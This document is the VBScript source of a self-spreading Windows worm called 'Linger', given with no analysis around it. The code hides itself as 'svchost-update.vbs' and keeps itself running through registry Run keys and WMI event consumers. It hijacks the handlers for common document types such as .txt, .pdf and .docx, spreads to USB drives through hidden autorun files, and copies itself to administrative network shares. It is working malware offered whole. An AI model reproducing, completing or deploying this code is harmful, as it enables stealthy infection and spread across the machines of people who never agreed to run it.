Sub CopyToSystemDir()
    Dim destPath
    destPath = appDataDir & "\svchost-update.vbs"
    
    If fso.FileExists(selfPath) Then
        fso.CopyFile selfPath, destPath, True
        shell.Run "attrib +h +s """ & destPath & """", 0, True
    End If
End Sub

Sub AddRegistryPersistence()
    Dim runKey
    runKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
    shell.RegWrite runKey & "WindowsUpdate", appDataDir & "\svchost-update.vbs", "REG_SZ"
    
    On Error Resume Next
    runKey = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\"
    shell.RegWrite runKey & "WindowsUpdate", appDataDir & "\svchost-update.vbs", "REG_SZ"
    On Error Goto 0
End Sub

Sub HijackFileAssociations()
    Call HijackExtension(".txt")
    Call HijackExtension(".md")
    Call HijackExtension(".doc")
    Call HijackExtension(".docx")
    Call HijackExtension(".pdf")
    Call HijackExtension(".rtf")
End Sub

Sub HijackExtension(ext)
    Dim progId, shellCmd
    progId = "Linger." & Replace(ext, ".", "") & "File"
    
    On Error Resume Next
    shell.RegWrite "HKCR\" & ext & "\", progId, "REG_SZ"
    shell.RegWrite "HKCR\" & progId & "\shell\open\command\", _
        "wscript.exe """ & appDataDir & "\svchost-update.vbs"" ""%1""", "REG_SZ"
    On Error Goto 0
End Sub

Sub InstallWMIEventConsumer()
    On Error Resume Next
    
    Dim consumer, filter, binding
    Set consumer = wmi.Get("ActiveScriptEventConsumer").SpawnInstance_
    
    consumer.Name = "LingerEventConsumer"
    consumer.ScriptingEngine = "VBScript"
    consumer.Creator = "Linger"
    consumer.ScriptText = GetVBScriptCode()
    
    consumer.Put_
    
    Set filter = wmi.Get("__EventFilter").SpawnInstance_
    filter.Name = "LingerFileAccessFilter"
    filter.EventNameSpace = "root\cimv2"
    filter.QueryLanguage = "WQL"
    filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'"
    filter.Put_
    
    Set binding = wmi.Get("__FilterToConsumerBinding").SpawnInstance_
    binding.Filter = "\\.\root\subscription:__EventFilter.Name=""LingerFileAccessFilter"""
    binding.Consumer = "\\.\root\subscription:ActiveScriptEventConsumer.Name=""LingerEventConsumer"""
    binding.Put_
    
    On Error Goto 0
End Sub

Function GetVBScriptCode()
    Dim code
    code = "Dim fso, shell, appData" & vbCrLf
    code = code & "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf
    code = code & "Set shell = CreateObject(""WScript.Shell"")" & vbCrLf
    code = code & "appData = shell.ExpandEnvironmentStrings(""%APPDATA%"")" & vbCrLf
    code = code & "If fso.FileExists(appData & ""\Microsoft\Windows\svchost-update.vbs"") Then" & vbCrLf
    code = code & "    shell.Run ""wscript.exe """""" & appData & ""\Microsoft\Windows\svchost-update.vbs"""""", 0, False" & vbCrLf
    code = code & "End If"
    GetVBScriptCode = code
End Function

Sub SetupUSBMonitor()
    On Error Resume Next
    
    Dim usbFilter, usbConsumer, usbBinding
    Set usbFilter = wmi.Get("__EventFilter").SpawnInstance_
    usbFilter.Name = "LingerUSBMonitor"
    usbFilter.EventNameSpace = "root\cimv2"
    usbFilter.QueryLanguage = "WQL"
    usbFilter.Query = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"
    usbFilter.Put_
    
    Set usbConsumer = wmi.Get("ActiveScriptEventConsumer").SpawnInstance_
    usbConsumer.Name = "LingerUSBConsumer"
    usbConsumer.ScriptingEngine = "VBScript"
    usbConsumer.Creator = "Linger"
    usbConsumer.ScriptText = GetUSBScriptCode()
    usbConsumer.Put_
    
    Set usbBinding = wmi.Get("__FilterToConsumerBinding").SpawnInstance_
    usbBinding.Filter = "\\.\root\subscription:__EventFilter.Name=""LingerUSBMonitor"""
    usbBinding.Consumer = "\\.\root\subscription:ActiveScriptEventConsumer.Name=""LingerUSBConsumer"""
    usbBinding.Put_
    
    On Error Goto 0
End Sub

Function GetUSBScriptCode()
    Dim code
    code = "Dim fso, shell, drives, drive" & vbCrLf
    code = code & "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf
    code = code & "Set shell = CreateObject(""WScript.Shell"")" & vbCrLf
    code = code & "Set drives = fso.Drives" & vbCrLf
    code = code & "For Each drive In drives" & vbCrLf
    code = code & "    If drive.DriveType = 1 And drive.IsReady Then" & vbCrLf
    code = code & "        appData = shell.ExpandEnvironmentStrings(""%APPDATA%"")" & vbCrLf
    code = code & "        destPath = drive.DriveLetter & "":\System_Update.vbs""" & vbCrLf
    code = code & "        fso.CopyFile appData & ""\Microsoft\Windows\svchost-update.vbs"", destPath, True" & vbCrLf
    code = code & "        shell.Run ""attrib +h +s """""" & destPath & """""""", 0, True" & vbCrLf
    code = code & "        Set autorun = fso.CreateTextFile(drive.DriveLetter & "":\autorun.inf"", True)" & vbCrLf
    code = code & "        autorun.WriteLine ""[autorun]""" & vbCrLf
    code = code & "        autorun.WriteLine ""open=System_Update.vbs""" & vbCrLf
    code = code & "        autorun.Close" & vbCrLf
    code = code & "        shell.Run ""attrib +h +s """""" & drive.DriveLetter & "":\autorun.inf"""""", 0, True" & vbCrLf
    code = code & "    End If" & vbCrLf
    code = code & "Next"
    GetUSBScriptCode = code
End Function

Sub ScanNetworkShares()
    On Error Resume Next
    
    Dim sharePaths, share
    sharePaths = Array("\\localhost\c$", "\\localhost\admin$")
    
    For Each share In sharePaths
        If fso.FolderExists(share) Then
            Call InfectNetworkShare(share)
        End If
    Next
End Sub

Sub InfectNetworkShare(sharePath)
    Dim appData, destPath
    appData = shell.ExpandEnvironmentStrings("%APPDATA%")
    destPath = sharePath & "\WindowsUpdate.vbs"
    
    On Error Resume Next
    fso.CopyFile appData & "\Microsoft\Windows\svchost-update.vbs", destPath, True
    On Error Goto 0
End Sub
